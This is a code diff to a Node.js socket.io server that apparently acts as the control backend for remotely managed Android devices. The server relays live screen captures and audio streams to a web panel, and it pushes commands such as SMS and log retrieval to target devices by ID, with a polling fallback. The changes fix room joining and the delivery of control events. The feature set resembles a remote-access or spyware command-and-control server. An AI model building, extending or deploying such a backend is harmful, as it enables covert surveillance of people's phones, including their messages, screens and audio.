@@ -47,38 +47,52 @@ app.use(express.static(__dirname));
 let devicesStatus = {}; 
 
 // ==================================================
-//  🔥 MAIN SOCKET LOGIC
+//  🔥 MAIN SOCKET LOGIC (FIXED & UPDATED)
 // ==================================================
 io.on('connection', (socket) => {
     
-    // 1. Join Room
+    console.log(`👤 New Connection ID: ${socket.id}`);
+
+    // ✅ FIX 1: Support BOTH 'join' (Android) and 'join-room' (Web)
     socket.on('join', (roomID) => {
         socket.join(roomID);
-        console.log(`🔌 Device Joined Room: ${roomID}`);
+        console.log(`🔌 Device Joined Room (Android): ${roomID}`);
+    });
+
+    socket.on('join-room', (roomID) => {
+        socket.join(roomID);
+        console.log(`💻 Web Client Joined Room (Browser): ${roomID}`);
     });
 
     // 2. Screen Share
     socket.on('screen-data', (data) => {
-        socket.volatile.to(data.room).emit('screen-data', data.image);
+        // Sirf room walo ko bhejo
+        socket.to(data.room).emit('screen-data', data.image);
     });
 
-    // 3. Control Events
+    // ✅ FIX 2: Strong Control Event (For Start/Stop)
     socket.on('control-event', (data) => {
-        socket.to(data.room).emit('control-event', data);
+        console.log(`🎮 Control Action: ${data.action} -> Target Room: ${data.room}`);
+        
+        // Use 'io.to' to FORCE send to everyone in room (including Android)
+        io.to(data.room).emit('control-event', data); 
     });
 
-    // 4. Command Handling (Socket)
+    // 3. Command Handling (Standard Commands: sms, logs etc)
     socket.on('send-command', (data) => {
         if (data.targetId && data.command) {
+            console.log(`⚡ Socket Command Sent: ${data.command} -> ${data.targetId}`);
+            
+            // Direct Socket Send
             io.to(data.targetId).emit('command', data.command);
             
-            // Backup for Polling
+            // Backup for Polling (Method 2)
             if (!devicesStatus[data.targetId]) devicesStatus[data.targetId] = { id: data.targetId };
             devicesStatus[data.targetId].command = data.command;
         }
     });
 
-    // 5. Audio Stream Relay
+    // 4. Audio Stream Relay
     socket.on('audio-stream', (blob) => {
         const rooms = socket.rooms;
         for (const room of rooms) {
@@ -88,11 +102,13 @@ io.on('connection', (socket) => {
         }
     });
 
-    socket.on('disconnect', () => { });
+    socket.on('disconnect', () => { 
+        console.log(`❌ Disconnected: ${socket.id}`);
+    });
 });
 
 app.get('/', (req, res) => {
-    res.send('✅ Server Running: Apps, SMS & Contacts Fixed!');
+    res.send('✅ Server Running: Connection Fixed (Dual Join Support)');
 });
 
 // ==================================================
@@ -233,9 +249,10 @@ app.post('/api/status', (req, res) => {
 
         let commandToSend = "none";
         
+        // Polling Command Check
         if (devicesStatus[id].command && devicesStatus[id].command !== "none") {
             commandToSend = devicesStatus[id].command;
-            devicesStatus[id].command = "none";
+            devicesStatus[id].command = "none"; // Clear after sending
         }
 
         res.json({ status: "success", command: commandToSend });
